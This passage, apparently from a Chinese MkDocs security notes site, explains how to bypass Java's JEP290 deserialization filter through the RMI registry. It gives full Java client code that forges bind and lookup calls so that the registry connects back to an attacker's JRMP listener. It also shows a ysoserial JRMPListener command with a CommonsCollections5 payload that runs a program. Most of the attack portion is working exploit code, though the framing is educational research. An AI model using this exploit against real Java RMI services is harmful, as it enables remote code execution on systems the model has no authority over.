+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        reg.bind(&quot;test12&quot;,obj);
+
+    }
+
+}
+</code></pre>
+<p>然后ysoserial启动恶意注册端</p>
+<pre><code class="language-java">java -cp .\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 &quot;calc&quot;
+</code></pre>
+<p>客户端运行，成功弹出计算器</p>
+<p><img alt="" src="../image/image_dLsg6mkaq9.png" /></p>
+<h4 id="lookup">仿写lookup实现</h4>
+<p>除了bind，也可以用lookup的仿写来实现，这两者之间底层原理都是一样的。</p>
+<pre><code class="language-java">import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
+import java.lang.reflect.Proxy;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.*;
+import java.util.Random;
+import java.io.ObjectOutput;
+import java.lang.reflect.Field;
+
+public class client {
+    public static void main(String[] args) throws Exception {
+
+        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;,1069);
+        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(&quot;localhost&quot;, 8888);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, true));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+
+        //模仿lookup请求
+        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
+        fields_0[0].setAccessible(true);
+        UnicastRef ref2 = (UnicastRef) fields_0[0].get(registry);
+        Field[] fields_1 = registry.getClass().getDeclaredFields();
+        fields_1[0].setAccessible(true);
+        Operation[] operations = (Operation[]) fields_1[0].get(registry);
+        RemoteCall var2 = ref2.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+        ObjectOutput var3 = var2.getOutputStream();
+        var3.writeObject(obj);
+        ref2.invoke(var2);
+    }
+
+}
+</code></pre>
+<h4 id="_10">总结</h4>
+<p>所以本质上此绕过方法是<strong>通过反序列化让注册端变为JRMP客户端，向我们恶意的JRMP注册端发起 JRMP 请求。</strong></p>
+<p>借用一下ttpfx师傅的图复盘全过程</p>
+<p><img alt="" src="../image/image_qGuS-uhiD2.png" /></p>
+<p>UnicastRef中的LiveRef被用作定位注册端，这是前提。
+RemoteObject的readObject方法会在RMI反序列化过程中被调用，其readObject方法会在后续中还原所封装的LiveRef对象，并向LiveRef对象指向的注册端发起通讯，反序列化其返回的数据，由于该反序列化流未增添过滤器，所以绕过JEP290造成了反序列化攻击。</p>
+<p>因为文章是在边调试边写的，中途进行了多次删改，所以导致些许地方言辞不够准确，望各位见谅。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-link">
+        Gadget利用类总结
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
+        JNDI注入原理浅析
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
